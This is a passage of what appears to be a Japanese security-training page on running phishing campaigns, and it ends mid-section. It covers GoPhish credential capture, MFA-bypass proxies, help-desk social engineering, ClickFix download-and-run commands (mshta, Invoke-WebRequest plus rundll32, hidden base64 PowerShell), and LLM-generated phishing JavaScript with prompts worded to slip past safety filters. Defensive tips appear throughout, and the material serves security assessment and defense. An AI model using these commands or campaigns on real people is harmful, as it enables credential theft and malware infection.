# Phishingの手法

{{#include ../../banners/hacktricks-training.md}}

## 手法

1. 被害者をReconする
   1. **被害者のドメイン**を選択する。
   2. 基本的なWeb enumerationを行い、被害者が使用する**ログインポータルを探し**、どれを**なりすまし**の対象にするか**決める**。
   3. **OSINT**を利用して**メールアドレスを見つける**。
2. 環境を準備する
   1. フィッシング評価に使用する**ドメインを購入する**
   2. メールサービス関連のレコード（SPF、DMARC、DKIM、rDNS）を**設定する**
   3. VPSに**gophish**を設定する
3. キャンペーンを準備する
   1. **メールテンプレート**を用意する
   2. 認証情報を盗むための**Webページ**を用意する
4. キャンペーンを開始する！

## 類似ドメイン名を生成する、または信頼できるドメインを購入する

### ドメイン名のバリエーション手法

- **Keyword**: ドメイン名に元のドメインの重要な**キーワードが含まれる**（例: zelster.com-management.com）。<sup>[[1]](#references)</sup>
- **ハイフン付きサブドメイン**: サブドメインの**ドットをハイフンに変更する**（例: www-zelster.com）。
- **新しいTLD**: 同じドメイン名で**新しいTLDを使用する**（例: zelster.org）
- **Homoglyph**: ドメイン名の文字を**見た目が似ている文字に置き換える**（例: zelfser.com）。


{{#ref}}
homograph-attacks.md
{{#endref}}
- **入れ替え:** ドメイン名の**2文字を入れ替える**（例: zelsetr.com）。
- **単数形化／複数形化**: ドメイン名の末尾に「s」を追加、または削除する（例: zeltsers.com）。
- **省略**: ドメイン名から文字を**1つ削除する**（例: zelser.com）。
- **重複:** ドメイン名の文字を**1つ重複させる**（例: zeltsser.com）。
- **置換**: Homoglyphと似ているが、より発見されやすい。ドメイン名の文字を1つ置き換える。たとえば、キーボード上で元の文字の近くにある文字に置き換える（例: zektser.com）。
- **サブドメイン化**: ドメイン名の途中に**ドット**を入れる（例: ze.lster.com）。
- **挿入**: ドメイン名に**文字を1つ挿入する**（例: zerltser.com）。
- **ドット抜け**: TLDをドメイン名に追加する（例: zelstercom.com）。

**自動化ツール**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Webサイト**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

太陽フレア、宇宙線、ハードウェアエラーなどのさまざまな要因により、保存中または通信中のビットが自動的に反転する可能性があります。

この概念を**DNSリクエストに適用すると**、**DNSサーバーが受け取るドメイン**が、最初に要求されたドメインと異なる可能性があります。

たとえば、「windows.com」のビットが1つ変更されると、「windnws.com」に変わることがあります。

攻撃者は、被害者のドメインに似た複数のbitflippingドメインを登録して、これを**悪用する可能性があります**。正規のユーザーを自分たちのインフラに誘導することが狙いです。

詳しくは[https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)を参照してください。<sup>[[10]](#references)[[11]](#references)</sup>

### 信頼できるドメインを購入する

[https://www.expireddomains.net/](https://www.expireddomains.net)で、使用できそうな期限切れドメインを検索できます。\
購入する期限切れドメインが**すでに良好なSEO評価を得ているか**を確認するには、以下でのカテゴリ分類を調べてください。

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## メールアドレスの発見

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester)（完全無料）
- [https://phonebook.cz/](https://phonebook.cz)（完全無料）
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

有効なメールアドレスをさらに**見つける**、またはすでに発見したアドレスを**検証する**には、被害者のSMTPサーバーに対してブルートフォースできるか確認できます。[メールアドレスの検証／発見方法はこちら](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration)。\
また、ユーザーがメールにアクセスするために**Webポータルを使用している場合**、**ユーザー名のブルートフォース**に対して脆弱か確認し、可能であればその脆弱性を悪用することも忘れないでください。

## GoPhishの設定

### インストール

[https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)からダウンロードできます。

`/opt/gophish`内にダウンロードして展開し、`/opt/gophish/gophish`を実行します。\
出力に、ポート3333のadminユーザー用パスワードが表示されます。そのポートにアクセスし、表示された認証情報を使ってadminのパスワードを変更してください。ポートをローカルにトンネルする必要がある場合があります。

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### 設定

**TLS 証明書の設定**

この手順を始める前に、使用する**ドメインを購入済み**であり、**gophish**を設定しているVPSの**IPを指すように設定されている**必要があります。

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**メールの設定**

インストールを開始します: `apt-get install postfix`

次のファイルにドメインを追加します:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**/etc/postfix/main.cf** 内の次の変数の値も変更します

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

最後に、**`/etc/hostname`** と **`/etc/mailname`** の内容をドメイン名に変更し、**VPSを再起動します。**

次に、`mail.<domain>` をVPSの **IPアドレス** に向ける **DNS Aレコード** と、`mail.<domain>` を指定する **DNS MXレコード** を作成します。

では、メールを送信してテストしてみましょう:

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Gophishの設定**

gophishの実行を停止し、設定しましょう。\
`/opt/gophish/config.json`を次のように変更します（httpsの使用に注意してください）:

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**gophish サービスの設定**

gophish サービスを作成して自動起動し、サービスとして管理できるようにするには、次の内容で `/etc/init.d/gophish` ファイルを作成します。

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

次の作業を行って、サービスの設定を完了し、動作を確認します:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## メールサーバーとドメインの設定

### 待って正規の状態にする

ドメインは古いほど、spam として検出される可能性が低くなります。そのため、phishing assessment の前にできるだけ長く（最低1週間）待つ必要があります。さらに、評判の良い業界のページを設置すると、より良い評判を得られます。

1週間待つ必要がある場合でも、今すぐすべての設定を完了できることに注意してください。

### Reverse DNS（rDNS）レコードの設定

VPS の IP アドレスがドメイン名に解決される rDNS（PTR）レコードを設定します。

### Sender Policy Framework（SPF）レコード

**新しいドメインに SPF レコードを設定する必要があります**。SPF レコードが何かわからない場合は、[**こちらのページを読んでください**](../../network-services-pentesting/pentesting-smtp/index.html#spf)。

[https://www.spfwizard.net/](https://www.spfwizard.net) を使って SPF ポリシーを生成できます（VPS マシンの IP を使用してください）。

![phishing ドメイン用の SPF レコードを生成する SPF Wizard のフォーム](<../../images/image (1037).png>)

ドメイン内の TXT レコードに設定する内容は次のとおりです：

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Domain-based Message Authentication, Reporting & Conformance (DMARC) レコード

**新しいドメインにDMARCレコードを設定する必要があります**。DMARCレコードについて知らない場合は、[**このページを読んでください**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc)。

ホスト名 `_dmarc.<domain>` を指定し、次の内容を設定した新しいDNS TXTレコードを作成する必要があります。

```bash
v=DMARC1; p=none
```

### ドメインキー識別メール (DKIM)

**新しいドメインに DKIM を設定する必要があります**。DKIM レコードが何かわからない場合は、[**このページを読んでください**](../../network-services-pentesting/pentesting-smtp/index.html#dkim)。

このチュートリアルは、次の内容に基づいています: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)。<sup>[[5]](#references)</sup>

> [!TIP]
> DKIM キーが生成する 2 つの B64 値を連結する必要があります:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### メール設定のスコアをテストする

[https://www.mail-tester.com/](https://www.mail-tester.com)を使ってテストできます。\
ページにアクセスして、指定されたアドレスにメールを送信するだけです：

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

`check-auth@verifier.port25.com` にメールを送信して**応答を読む**ことで、**メールの設定を確認する**こともできます（そのためにはポート **25** を開き、root としてメールを送信した場合はファイル _/var/mail/root_ で応答を確認する必要があります）。\
すべてのテストに合格することを確認してください:

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

**自分の管理下にある Gmail アカウントにメッセージを送信**し、Gmail の受信トレイで**メールのヘッダー**を確認する方法もあります。`Authentication-Results` ヘッダーフィールドに `dkim=pass` が含まれているはずです。

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### ​Spamhouse Blacklistからの削除

[www.mail-tester.com](https://www.mail-tester.com) のページで、ドメインがspamhouseによってブロックされているか確認できます。ドメイン/IPの削除は、こちらから申請できます: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Microsoft Blacklistからの削除

​​ドメイン/IPの削除は、こちらから申請できます: [https://sender.office.com/](https://sender.office.com)。

## GoPhish Campaignの作成と開始

### Sending Profile

- 送信者プロフィールを**識別するための名前**を設定します
- フィッシングメールをどのアカウントから送信するか決めます。候補: _noreply, support, servicedesk, salesforce..._
- usernameとpasswordは空欄のままでもかまいませんが、Ignore Certificate Errorsに必ずチェックを入れてください

![GoPhish Campaignの作成と開始 - Sending Profile: usernameとpasswordは空欄のままでもかまいませんが、Ignore Certificate Errorsに必ずチェックを入れてください](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> すべてが正常に動作するか確認するため、"**Send Test Email**" 機能を使用してテストすることをおすすめします。\
> テストでブラックリストに登録されるのを避けるため、テストメールは**10min mailのアドレスに送信する**ことをおすすめします。

### Email Template

- テンプレートを**識別するための名前**を設定します
- 次に**subject**を入力します（不自然なものではなく、通常のメールで受け取ることが予想される内容にします）
- "**Add Tracking Image**"にチェックが入っていることを確認します
- **email template**を記述します（次の例のように変数を使用できます）:

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

なお、**メールの信頼性を高めるために**、クライアントから届いたメールの署名を使うことをおすすめします。以下の方法を試してください。

- **存在しないアドレス**にメールを送り、署名付きの返信があるか確認する。
- info@ex.com、press@ex.com、public@ex.com などの**公開メールアドレス**を探してメールを送り、返信を待つ。
- 有効だと判明したメールアドレスの**いずれかに連絡**して、返信を待つ。

![送信プロファイル - メールテンプレート: 有効だと判明したメールアドレスのいずれかに連絡して、返信を待つ](<../../images/image (80).png>)

> [!TIP]
> メールテンプレートでは、**送信するファイルを添付する**こともできます。細工したファイルや文書を使ってNTLM challengeも盗みたい場合は、[こちらのページをお読みください](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)。

### ランディングページ

- **名前**を入力する
- Webページの**HTMLコードを入力する**。Webページを**インポート**することもできます。
- **Capture Submitted Data** と **Capture Passwords** にチェックを入れる
- **リダイレクト先**を設定する

![メールテンプレート - ランディングページ: Capture Submitted Data と Capture Passwords にチェックを入れる](<../../images/image (826).png>)

> [!TIP]
> 通常は、ページのHTMLコードを編集し、ローカル環境（Apache serverなどを使用）でテストして、**結果に納得できるまで調整する**必要があります。その後、そのHTMLコードをボックスに入力します。\
> HTMLで**静的リソース**（CSSやJSのページなど）を使う必要がある場合は、_**/opt/gophish/static/endpoint**_ に保存し、_**/static/\<filename>**_ からアクセスできます。

> [!TIP]
> リダイレクト先には、被害者の正規のメインWebページを指定するか、たとえば _/static/migration.html_ にリダイレクトできます。**回転する読み込みアイコン (**[**https://loading.io/**](https://loading.io)**) を5秒間表示してから、処理が成功したことを示す**方法もあります。

### ユーザーとグループ

- 名前を設定する
- **データをインポートする**（例のテンプレートを使用するには、各ユーザーの名、姓、メールアドレスが必要です）

![ランディングページ - ユーザーとグループ: データをインポートする（例のテンプレートを使用するには、各ユーザーの名、姓、メールアドレスが必要です）](<../../images/image (163).png>)

### キャンペーン

最後に、名前、メールテンプレート、ランディングページ、URL、送信プロファイル、グループを選択してキャンペーンを作成します。URLは被害者に送信するリンクです。

**送信プロファイルではテストメールを送信し、最終的なフィッシングメールがどのように表示されるか確認できます**。

![ユーザーとグループ - キャンペーン: 送信プロファイルではテストメールを送信し、最終的なフィッシングメールがどのように表示されるか確認できます](<../../images/image (192).png>)

準備ができたら、キャンペーンを開始するだけです。

## Webサイトのクローン作成

何らかの理由でWebサイトをクローンしたい場合は、次のページを確認してください。


{{#ref}}
clone-a-website.md
{{#endref}}

## バックドア化された文書とファイル

一部のフィッシング評価（主にRed Team向け）では、**何らかのバックドアを含むファイル**（C2や、認証を発生させるだけのものなど）も送信したい場合があります。\
例については、次のページを確認してください。


{{#ref}}
phishing-documents.md
{{#endref}}

## MFAフィッシング

### Proxy MitM経由

前述の攻撃は、実際のWebサイトを偽装し、ユーザーが入力した情報を収集する巧妙な手法です。しかし、ユーザーが正しいパスワードを入力しなかった場合や、偽装したアプリケーションで2FAが設定されている場合、**この情報だけでは、だまされたユーザーになりすますことはできません**。

ここで[**evilginx2**](https://github.com/kgretzky/evilginx2)**、**[**CredSniper**](https://github.com/ustayready/CredSniper)、[**muraena**](https://github.com/muraenateam/muraena)のようなツールが役立ちます。これらのツールを使うと、MitMのような攻撃を実行できます。基本的に、攻撃は次のように進みます。

1. 実際のWebページのログインフォームに**なりすます**。
2. ユーザーが偽のページに**認証情報を送信**すると、ツールがそれを実際のWebページに送信し、**認証情報が有効か確認する**。
3. アカウントに**2FA**が設定されている場合、MitMページが2FAコードを要求し、**ユーザーが入力**すると、ツールが実際のWebページに送信する。
4. ユーザーが認証されると、ツールがMitMを実行している間のやり取りから、攻撃者は**認証情報、2FAコード、cookie、その他の情報をすべて取得できる**。

### VNC経由

元のWebページと同じ見た目の**悪意あるページに被害者を誘導する**代わりに、実際のWebページに接続したブラウザーを備える**VNC sessionに誘導**したらどうでしょうか。被害者の操作を確認し、パスワード、使用したMFA、cookieなどを盗むことができます。\
[**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)を使えば、これを実行できます。<sup>[[3]](#references)[[4]](#references)</sup>

## 検知されたことを検知する

発覚したかどうかを知る最善の方法の一つは、**自分のドメインがブラックリストに登録されていないか検索すること**です。登録されている場合、何らかの方法でドメインが疑わしいと検知されたことになります。\
自分のドメインがブラックリストに登録されているか簡単に確認するには、[https://malwareworld.com/](https://malwareworld.com)を利用できます。

ただし、被害者が**実際の環境で疑わしいフィッシング活動を積極的に探しているか**を知る方法は、ほかにもあります。詳しくは次のページで説明しています。


{{#ref}}
detecting-phising.md
{{#endref}}

被害者のドメインと**非常によく似た名前のドメインを購入する**、または自分が管理するドメインの**サブドメイン用の証明書を発行し**、被害者のドメインの**キーワードを含める**ことができます。**被害者**がそれらに対して何らかの**DNSまたはHTTP通信**を行った場合、**疑わしいドメインを積極的に調査している**と分かるため、非常にステルスに行動する必要があります。<sup>[[2]](#references)</sup>

### フィッシングを評価する

[**Phishious** ](https://github.com/Rices/Phishious)を使うと、メールがスパムフォルダーに入るのか、ブロックされるのか、あるいは配信に成功するのかを評価できます。

## 高度な本人確認を伴うIDの侵害（ヘルプデスクによるMFAリセット）

最近の侵入グループは、MFAを突破するためにメールによる誘導を省略し、**サービスデスクやIDリカバリーのワークフローを直接狙う**ことが増えています。この攻撃は完全な「living-off-the-land」です。有効な認証情報を手に入れた後は、組み込みの管理ツールを使って侵入を拡大し、マルウェアは必要ありません。<sup>[[6]](#references)</sup>

### 攻撃の流れ
1. 被害者を偵察する 
   * LinkedIn、data breach、公開GitHubなどから、個人情報や企業情報を収集する。  
   * 価値の高いID（幹部、IT、財務担当者など）を特定し、パスワードやMFAのリセットに関する**正確なヘルプデスクの手順**を調べる。
2. リアルタイムのソーシャルエンジニアリング  
   * 標的になりすまして、電話、Teams、チャットでヘルプデスクに連絡する（多くの場合、**発信者番号の偽装**や**音声のクローン**を使う）。  
   * 事前に収集したPIIを提示し、知識ベースの本人確認を通過する。  
   * 担当者を説得して、**MFA secretをリセット**させるか、登録済みの携帯電話番号を**SIM-swap**させる。
3. アクセス取得直後の行動（実際のケースでは60分以内）  
   * Web SSO portalを通じて足がかりを確立する。  
   * バイナリを配置せず、組み込みツールでAD / AzureADを列挙する:
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * **WMI**、**PsExec**、または環境内ですでに許可リストに登録されている正規の **RMM** エージェントを使った Lateral movement。

### 検知と緩和策
* ヘルプデスクによる本人確認情報の復旧を**特権操作**として扱い、追加認証とマネージャーの承認を必須にする。
* **Identity Threat Detection & Response (ITDR)** / **UEBA** のルールを導入し、以下を検知した場合にアラートを発する。  
  * MFA の認証方法が変更され、新しいデバイスまたは地域から認証が行われた場合。  
  * 同じプリンシパルが直後に権限昇格した場合（user-→-admin）。
* ヘルプデスクへの通話を録音し、リセットの前に**登録済みの電話番号への折り返し**を必須にする。
* **Just-In-Time (JIT) / Privileged Access** を導入し、リセット直後のアカウントが高権限トークンを自動的に継承しないようにする。

---

## 大規模な欺瞞 – SEO poisoning と「ClickFix」キャンペーン
一般的な攻撃者グループは、手間のかかる作戦のコストを、**検索エンジンや広告ネットワークを配信経路に変える**大量攻撃で補う。<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** により、`chromium-update[.]site` のような偽の検索結果を検索広告の上位に表示させる。
2. 被害者が小型の**第1段階ローダー**（多くの場合、JS/HTA/ISO）をダウンロードする。Unit 42 が確認した例：
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. ローダーがブラウザーの Cookie と認証情報 DB を外部に送信し、その後、**サイレントローダー**を取得する。このローダーは、*リアルタイム*で以下のどれを展開するか判断する。
   * RAT（AsyncRAT、RustDesk など）
   * ransomware / wiper
   * persistence コンポーネント（レジストリの Run キーとスケジュールされたタスク）

### 強化のヒント
* 新規登録ドメインをブロックし、メールだけでなく*検索広告*にも **Advanced DNS / URL Filtering** を適用する。
* ソフトウェアのインストールを署名済み MSI / Store パッケージに限定し、ポリシーで `HTA`、`ISO`、`VBS` の実行を拒否する。
* ブラウザーの子プロセスがインストーラーを起動していないか監視する。
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* first-stage loader によく悪用される LOLBins（例: `regsvr32`、`curl`、`mshta`）を探す。

### TDS への引き渡しを伴うダウンロードボタンのクリック乗っ取り
偽のソフトウェア配布サイトの中には、表示上のダウンロード `href` は**本物の** GitHub/release URL を指したまま、JavaScript でユーザーの**最初の**操作を乗っ取り、被害者を代わりに **Traffic Distribution System (TDS)** のチェーンへ誘導するものがあります。<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

主な特徴:
- hook は通常、`document` 上で **capture phase**（`true`）に実行されるため、サイト側の handler より先に発火します。
- Chrome では、有効な **user gesture** にリダイレクトを紐付け、popup blocker の bypass を向上させるため、`click` の代わりに `mousedown` がよく使われます。
- 一部の variant は `about:blank` を事前に開いたり、`<a target="_blank">` のクリックを合成したりして、後から TDS URL を設定します。
- ブラウザー側の上限は一般に `localStorage` に保存されるため、**最初のクリック**では malware に誘導されても、再読み込みや再試行では無害に見える表示リンクにフォールバックする場合があります。
- TDS は referrer、entry domain、GEO、browser/device fingerprint、VPN/datacenter のチェック、click context、セッションごとのカウンターで条件分岐できるため、analyst によるリプレイの結果は一定しません。

防御のヒント:
- **表示されている** `href` と、クリック時に生成される **実際の** navigation target を比較します。
- `window.open`、`about:blank`、合成された anchor のクリックとともに、`preventDefault()` と `stopImmediatePropagation()` の両方を呼び出す `document.addEventListener(..., true)` handler を探します。
- 新規登録されたソフトウェアダウンロード用ドメインのうち、同じ CloudFront/JS stage を読み込むもののまとまりは、SEO poisoning/TDS パターンを強く示すものとして扱います。

### 偽の検証ページを使った ClickFix + アーカイブ風の LOLBAS fetch
一部の TDS 分岐は、Cloudflare/IUAM 風の偽の検証ページに行き着き、信頼できる Windows binary（次のようなもの）の実行を被害者に促します:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

メモ:
- `mshta.exe` は、URLが`.7z`アーカイブを装っていても、レスポンスの先頭にある**HTA/VBScriptを実行**します。後ろに追加されたアーカイブデータは、完全なデコイの場合があります。
- 後続ステージでは、ファイル形式を偽装し続け（PowerShellを`.rtf`、Pythonを`.asar`、バイナリをパディングしたZIPとして偽装）、その後**手動PEマッピング / メモリ内実行**に切り替えることがよくあります。
- こうしたチェーンに対応する場合は、最初の実行成功時から**ネットワーク + メモリのデータを保全**してください。後のリプレイでは、無害なインストーラー/SFXの経路しか確認できなかったり、ペイロード/鍵のリリースが元のTDSセッションに紐づいていたために失敗したりすることがあります。

### ClickFix DLL 配信の手口（CERTアップデートを偽装）
* 誘い文句：国のCERT勧告を複製したページに、手順ごとの「修正」方法を表示する**Update**ボタンを配置します。被害者には、DLLをダウンロードして`rundll32`経由で実行するバッチを実行するよう指示します。<sup>[[12]](#references)</sup>
* 観測された典型的なバッチチェーン:
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * `Invoke-WebRequest` が payload を `%TEMP%` に保存し、短い sleep でネットワークの揺らぎを隠した後、`rundll32` がエクスポートされたエントリポイント（`notepad`）を呼び出します。
* DLL はホストの識別情報をビーコンとして送信し、数分ごとに C2 をポーリングします。リモートからのタスクは **base64 でエンコードされた PowerShell** として届き、非表示かつ実行ポリシーをバイパスして実行されます。
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * これによりC2の柔軟性（DLLを更新せずにサーバー側でタスクを切り替えられる）を維持し、コンソールウィンドウを隠せます。`-WindowStyle Hidden`、`FromBase64String`、`Invoke-Expression`をすべて組み合わせて使う`rundll32.exe`の子プロセスであるPowerShellを探してください。
* 防御側は、`...page.php?tynor=<COMPUTER>sss<USER>`形式のHTTP(S)コールバックや、DLLのロード後に5分間隔で行われるポーリングを探せます。

---

## RTBを介したディスプレイ広告表示時のマルバタイジング

クリックが必要なスポンサー付き検索結果と異なり、RTB広告は、Webサイトやアプリでクリエイティブが表示される際に、サードパーティのJavaScriptを読み込むことがあります。Citizen Labは、広告タグが広告識別子を使って別の判定サーバーにアクセスする事例を確認しました。大半のインプレッションでは空の応答が返されましたが、選ばれたインプレッションにはJavaScriptが返される可能性がありました。そのため、再生時に無害な応答が得られても、すべての閲覧者に同じコンテンツが配信されたとは限りません。<sup>[[14]](#references)</sup>

これは**配信メカニズム**であり、それ自体がエクスプロイトではありません。広告表示コンテキストでJavaScriptが実行されても、スパイウェアが自動的にインストールされるわけではありません。根本となるブラウザーまたはOSのエクスプロイトは開示されていないため、広告の表示や判定サーバーへのリクエストだけでは感染の証拠になりません。RTBターゲティングにおける識別子の紐付けについては、[脅威モデリングとアイデンティティの分離](../../privacy/threat-modeling-and-identity-separation.md)を参照してください。<sup>[[14]](#references)</sup>

## AIで強化されたフィッシング作戦
攻撃者は現在、**LLMおよび音声クローンAPI**を連携させ、完全にパーソナライズされた誘い文句を作成し、リアルタイムでやり取りします。

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|ランダムな文面とトラッキングリンクを使い、メール/SMSを10万件以上生成して送信する。|
|Generative AI|公開情報のM&Aやソーシャルメディア内の内輪ネタに言及する“一度限り”のメールを作成する。折り返し電話詐欺では、CEOのディープフェイク音声を使う。|
|Agentic AI|ドメインを自律的に登録し、オープンソースの情報を収集し、被害者がクリックしたものの認証情報を送信しなかった場合に、次段階のメールを作成する。|

**防御:**  
• ARC/DKIMの異常を通じて、信頼できない自動化によって送信されたメッセージを強調表示する**動的バナー**を追加する。  
• リスクの高い電話での依頼に対し、**音声生体認証のチャレンジフレーズ**を導入する。  
• セキュリティ意識向上プログラムで、AI生成の誘い文句を継続的にシミュレーションする。静的なテンプレートは時代遅れです。

認証情報フィッシングを目的としたagentic browsingの悪用については、こちらも参照してください。

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

秘密情報の棚卸しと検知を目的とした、AIエージェントによるローカルCLIツールおよびMCPの悪用については、こちらも参照してください。

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLMを利用したフィッシングJavaScriptの実行時組み立て（ブラウザー内でのコード生成）

攻撃者は無害に見えるHTMLを配信し、**信頼されたLLM API**にJavaScriptを要求して、**実行時にstealerを生成**し、ブラウザー内で実行できます（例: `eval`や動的な`<script>`）。<sup>[[8]](#references)</sup>

1. **難読化としてのプロンプト:** プロンプトにデータ窃取用URLやBase64文字列を埋め込み、表現を調整して安全フィルターを回避し、幻覚を減らす。
2. **クライアント側のAPI呼び出し:** ページのロード時にJSがパブリックなLLM（Gemini/DeepSeekなど）またはCDNプロキシを呼び出す。静的HTMLに含まれるのはプロンプト/API呼び出しのみ。
3. **組み立てて実行:** 応答を連結して実行する（アクセスごとにポリモーフィックに変化する）。

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil:** 生成されたコードが誘導内容を個別化し（例: LogoKit token parsing）、認証情報をプロンプトに隠されたエンドポイントへ送信する。

**回避の特徴**
